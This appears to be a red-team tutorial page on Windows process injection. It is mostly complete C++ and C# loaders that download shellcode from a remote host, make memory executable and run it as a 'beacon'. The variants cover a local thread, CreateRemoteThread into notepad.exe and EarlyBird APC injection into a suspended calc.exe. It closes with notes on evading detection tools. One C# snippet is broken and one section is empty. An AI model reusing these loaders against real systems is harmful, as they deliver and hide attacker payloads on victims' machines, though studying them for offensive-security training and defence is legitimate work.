import { Tab, Tabs, Callout } from 'nextra-theme-docs'

# Process Injection

Injecting shellcode into a process can be done through the following steps
## 1. Downloading shellcdoe
<Tabs items={['C++', 'C#']}>
  <Tab>
   ```c copy
    #include <Windows.h>
    #include <winhttp.h>
    #include <iostream>
    #include <vector>

    #pragma comment(lib, "winhttp.lib")

    std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

    int main()
    {
        std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
    }

    std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

        // initialise session
        HINTERNET hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

        // create session for target
        HINTERNET hConnect = WinHttpConnect(
            hSession,
            baseAddress,
            INTERNET_DEFAULT_HTTPS_PORT,            // port 443
            0);

        // create request handle
        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            filename,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);                   // ssl

        // send the request
        WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0);

        // receive response
        WinHttpReceiveResponse(
            hRequest,
            NULL);

        // read the data
        std::vector<BYTE> buffer;
        DWORD bytesRead = 0;

        do {

            BYTE temp[4096]{};
            WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

            if (bytesRead > 0) {
                buffer.insert(buffer.end(), temp, temp + bytesRead);
            }

        } while (bytesRead > 0);

        // close all the handles
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return buffer;
    }
```
  </Tab>
  <Tab>
    
```cs copy
    using System;
    using System.Net.Http;
    using System.Threading.Tasks;

    namespace LocalInjector{
        internal class Program
        {

        static async Task Main(string [] args)
        byte[] shellcode;
        using (var client = new HttpClient())
            {
            
                client.BaseAddress = new Uri("https://www.google.com");
                shellcode = await client.GetByteArrayAsync("/shellcode.bin");
            }


        }

        {
    }
  ```
  </Tab>

</Tabs>

## 2. Shellcode Execution

### 2.1 Direct shellcode Execution

- Now we have the shellcode into a local buffer.
- Dynamic memory allocations, such as vectors, are stored in heap memory. We could allocate a new region of memory and copy the shellcode into it, but we could just leave it and execute directly from the heap.
- Heap memory is **RW** (read, write) by default.  It does not have the *X* (execute) bit.  We can make a small region of the heap memory **RWX** using the [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) API
- This technique will inject and execute the  shellcode into the main thread of the process, that will cause the process to freeze, but the  beacon should start üòÅ
<Tabs items={['C++', 'C#']}>
  <Tab>
   ```c copy showLineNumbers {14-26} /VirtualProtect/
    #include <Windows.h>
    #include <winhttp.h>
    #include <iostream>
    #include <vector>

    #pragma comment(lib, "winhttp.lib")

    std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

    int main()
    {
        std::vector<BYTE> shellcode = Download(L"192.168.5.130\0", L"/shellcode.bin\0"); // We can use a URL instead of the IP

        // get pointer to buffer
        LPVOID ptr = &shellcode[0];

        // set memory to RWX 
        DWORD oldProtect;
        VirtualProtect(
            ptr,
            shellcode.size(),
            PAGE_EXECUTE_READWRITE,
            &oldProtect);

        // execute
        (*(void(*)()) ptr)();
    }

    std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

        // initialise session
        HINTERNET hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);          // make last parameter WINHTTP_FLAG_SECURE_DEFAULTS to enable ssl

        // create session for target
        HINTERNET hConnect = WinHttpConnect(
            hSession,
            baseAddress,
            INTERNET_DEFAULT_HTTP_PORT,            // change third parameter to INTERNET_DEFAULT_HTTPS_PORT to enable HTTPS
            0);

        // create request handle
        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            filename,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);                   // Make last parameter WINHTTP_FLAG_SECURE to enable ssl

        // send the request
        WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0);

        // receive response
        WinHttpReceiveResponse(
            hRequest,
            NULL);

        // read the data
        std::vector<BYTE> buffer;
        DWORD bytesRead = 0;

        do {

            BYTE temp[4096]{};
            WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

            if (bytesRead > 0) {
                buffer.insert(buffer.end(), temp, temp + bytesRead);
            }

        } while (bytesRead > 0);

        // close all the handles
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return buffer;
    }
```
  </Tab>
  <Tab>
    
```c# copy
    using System;
    using System.Net.Http;
    using System.Runtime.InteropServices;
    using System.Threading.Tasks;

    namespace LocalInjector
    {
        internal class Program
        {
            //To execute the shellcode, we need to marshal the pointer to a function delegate.
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            
            delegate void Beacon();

            [DllImport("kernel32.dll")]
            static extern unsafe bool VirtualProtect(
                byte* lpAddress,
                uint dwSize,
                MEMORY_PROTECTION flNewProtect,
                out MEMORY_PROTECTION lpflOldProtect);

            enum MEMORY_PROTECTION : uint
            {
                PAGE_EXECUTE_READ = 0x20,
                PAGE_EXECUTE_READWRITE = 0x40,
                PAGE_READWRITE = 0x04
            }

            static async Task Main(string[] args)
            {
                byte[] shellcode;
                using (var client = new HttpClient())
                {
                    client.BaseAddress = new Uri("192.168.5.130"); // you can put a domain instead of the IP
                    shellcode = await client.GetByteArrayAsync("/shellcode.bin");
                }
                // unsafe is used to indicate that we'll be using  unsafe code (accessing memory directly like in c++) outside the influence of the CLR 
                unsafe
                {
                    // The fixed keyword is used to access a pointer to the memory of an underlying variable, and will prevent the garbage collector from moving or reallocating the data.
                    fixed (byte* ptr = shellcode)
                    {
                        VirtualProtect(
                            ptr,
                            (uint)shellcode.Length,
                            MEMORY_PROTECTION.PAGE_EXECUTE_READWRITE,
                            out _);

                        var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
                        beacon();
                    }
                }
            }
        }
    }
  ```
  </Tab>

</Tabs>

Make sure to enable **Allow unsafe code** and uncheck the **prefer 32-bit**
![enable unsafe mode](/images/function-delegate.png)

### 2.2 Run shellcode in the background of the process
- Untill now, our shellcode is running in the main process, that why we notice that the process freezes when the shellcode executes.
- If we want the shellcode to run in the background, that means we run it in another thread using [CreateThread API](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread). It only needs a pointer to the shellcdoe
<Tabs items={['C++', 'C#']}>
  <Tab>
   ```c copy showLineNumbers {28-34} /CreateThread/
    #include <Windows.h>
    #include <winhttp.h>
    #include <iostream>
    #include <vector>
    #include <conio.h> 

    #pragma comment(lib, "winhttp.lib")

    std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

    int main()
    {
        std::vector<BYTE> shellcode = Download(L"192.168.5.130\0", L"/download/file.bin\0");

        // get pointer to buffer
        LPVOID ptr = &shellcode[0];

        // set memory to RWX
        DWORD oldProtect = 0;
        VirtualProtect(
            ptr,
            shellcode.size(),
            PAGE_EXECUTE_READWRITE,
            &oldProtect);

        // execute
        DWORD threadId = 0;
        HANDLE hThread = CreateThread(
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)ptr,
            NULL,
            0,
            &threadId);

        // close handle
        CloseHandle(hThread);

        // stop the program from closing
        std::cout << "Shellcode is running, press key to exit" << std::endl;
        _getch();
    }

    std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

        // initialise session
        HINTERNET hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);          // make last parameter WINHTTP_FLAG_SECURE_DEFAULTS to enable ssl

        // create session for target
        HINTERNET hConnect = WinHttpConnect(
            hSession,
            baseAddress,
            INTERNET_DEFAULT_HTTP_PORT,            // change third parameter to INTERNET_DEFAULT_HTTPS_PORT to enable HTTPS
            0);

        // create request handle
        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            filename,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);                   // Make last parameter WINHTTP_FLAG_SECURE to enable ssl

        // send the request
        WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0);

        // receive response
        WinHttpReceiveResponse(
            hRequest,
            NULL);

        // read the data
        std::vector<BYTE> buffer;
        DWORD bytesRead = 0;

        do {

            BYTE temp[4096]{};
            WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

            if (bytesRead > 0) {
                buffer.insert(buffer.end(), temp, temp + bytesRead);
            }

        } while (bytesRead > 0);

        // close all the handles
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return buffer;
    }
```
  </Tab>
  <Tab>
    
```c# copy showLineNumbers {51,52}
    using System;
    using System.Net.Http;
    using System.Runtime.InteropServices;
    using System.Threading;
    using System.Threading.Tasks;

    namespace LocalInjector
    {
        internal class Program
        {
            //To execute the shellcode, we need to marshal the pointer to a function delegate.
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            delegate void Beacon();

            [DllImport("kernel32.dll")]
            static extern unsafe bool VirtualProtect(
                byte* lpAddress,
                uint dwSize,
                MEMORY_PROTECTION flNewProtect,
                out MEMORY_PROTECTION lpflOldProtect);

            enum MEMORY_PROTECTION : uint
            {
                PAGE_EXECUTE_READ = 0x20,
                PAGE_EXECUTE_READWRITE = 0x40,
                PAGE_READWRITE = 0x04
            }

            static async Task Main(string[] args)
            {
                byte[] shellcode;
                using (var client = new HttpClient())
                {
                    client.BaseAddress = new Uri("http://192.168.5.130"); // you can put a domain instead of the IP
                    shellcode = await client.GetByteArrayAsync("/download/file.bin");
                }

                // unsafe is used to indicate that we'll be using unsafe code (accessing memory directly like in c++) outside the influence of the CLR 
                unsafe
                {
                    // The fixed keyword is used to access a pointer to the memory of an underlying variable, and will prevent the garbage collector from moving or reallocating the data.
                    fixed (byte* ptr = shellcode)
                    {
                        VirtualProtect(
                            ptr,
                            (uint)shellcode.Length,
                            MEMORY_PROTECTION.PAGE_EXECUTE_READWRITE,
                            out _);

                        var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
                        var thread = new Thread(new ThreadStart(beacon));
                        thread.Start();

                        Console.WriteLine("Shellcode is running, press key to exit");
                        Console.ReadKey();
                    }
                }
            }
        }
    }
  ```
  </Tab>

</Tabs>

### 2.3 Run the shellcode in a thread under another process
#### 2.3.1 Using CreateRemoteThread 
```c filename="Program.cpp" showLineNumbers copy 
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h> 

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
   LPSTARTUPINFOW startup_info = new STARTUPINFOW();
startup_info->cb = sizeof(STARTUPINFOW);
startup_info->dwFlags = STARTF_USESHOWWINDOW;

// create process info struct
PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

// null terminated command line
wchar_t cmd[] = L"notepad.exe\0";

// create process
CreateProcess(
    NULL,
    cmd,
    NULL,
    NULL,
    FALSE,
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    startup_info,
    process_info);

// download shellcode
std::vector<BYTE> shellcode = Download(L"192.168.5.130\0", L"/download/file.bin\0");

// allocate memory
LPVOID ptr = VirtualAllocEx(
    process_info->hProcess,
    NULL,
    shellcode.size(),
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE);
std::cout<<"Press any key to copy the shellcode into the allocated memory"<<std::endl;
_getch();

// copy shellcode
SIZE_T bytesWritten = 0;
WriteProcessMemory(
    process_info->hProcess,
    ptr,
    &shellcode[0],
    shellcode.size(),
    &bytesWritten);

std::cout << "Shellcode copied to the allocated memory" << std::endl;
_getch();
// create remote thread
DWORD threadId = 0;
HANDLE hThread = CreateRemoteThread(
    process_info->hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)ptr,
    NULL,
    0,
    &threadId);

_getch();
// close handles
CloseHandle(hThread);
CloseHandle(process_info->hThread);
CloseHandle(process_info->hProcess);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);          // make last parameter WINHTTP_FLAG_SECURE_DEFAULTS to enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTP_PORT,            // change third parameter to INTERNET_DEFAULT_HTTPS_PORT to enable HTTPS
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);                   // Make last parameter WINHTTP_FLAG_SECURE to enable ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
```
After executing `VirtualAllocEx()` the memory space will be allocated and given **RWX** flags, but It will be empty
![create remote thread](/images/create-remote-thread-1.png)
And after executing `WriteProcessMemory()` the allocated memory will contain the downloaded shellcode
![craete remote thread](/images/create-remote-thread-3.png)

#### 2.3.2 Using [QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) allows to queue a user-mode [asynchronous procedure call APC](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls). to be executed in the context of a specified thread.
- Each thread has an APC queue which only runs if the process enters an alterable state (suspension state).
- `QueueUserAPC()` just registers our APC under the APC queue of a thread udner a remote process, and when it gets scheduled, the shellcode will get executed.
- Disadvantage of this technique is that the malicious program cannot force the victim thread to execute the injected code ‚Äî the thread to which an APC was queued to, needs to enter/be in an alertable state. for more refer to https://medium.com/@s12deff/earlybird-apc-code-injection-92b302943200
- The difference between APC Injection and EarlyBird is that APC Injection inject your process to existing remote process, but in EarlyBird case, you create the process (in suspended state).
- This example shows a case called **EarlyBird APC queue code injection**
##### 2.3.2.1 EarlyBird

```c showlinenumbers filename="QueUeserAPC" copy
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h> 

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"calc.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    // download shellcode
    std::vector<BYTE> shellcode = Download(L"192.168.5.130\0", L"/download/file.bin\0");

    // allocate memory
    LPVOID ptr = VirtualAllocEx(
        process_info->hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        process_info->hProcess,
        ptr,
        &shellcode[0],
        shellcode.size(),
        &bytesWritten);

    // queue apc
    QueueUserAPC(
        (PAPCFUNC)ptr,
        process_info->hThread,
        0);

    // resumme process
    ResumeThread(process_info->hThread);

    // close handles
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);          // make last parameter WINHTTP_FLAG_SECURE_DEFAULTS to enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTP_PORT,            // change third parameter to INTERNET_DEFAULT_HTTPS_PORT to enable HTTPS
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);                   // Make last parameter WINHTTP_FLAG_SECURE to enable ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;

}
```

##### 2.3.2.1 Normal QueueUserAPC Injection


#### 2.3.3 Process Hollowing
- This technique is about starting a process in a suspended state and replace its **PE** /  legitimate code with malicious code.
- Only a limited number of Nt APIs are officially exposed and most of them via Windows driver header files.
- The Nt APIs are also largely undocumented, which makes them more difficult to use.  To use them in a user-application, we need to define them in our own header file.


#
<Callout type="info" emoji="üëª">
        The [Get-InjectedThread](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2) tool can detect the process injection done through the normal `CreateRemoteThread()` method, but can't detect the injection done through `QueueUserAPC()`, Refer to [exploring-process-injection-opsec-part-1](https://rastamouse.me/exploring-process-injection-opsec-part-1/) & [exploring-process-injection-opsec-part-2](https://rastamouse.me/exploring-process-injection-opsec-part-2/?ref=boschko.ca)
</Callout>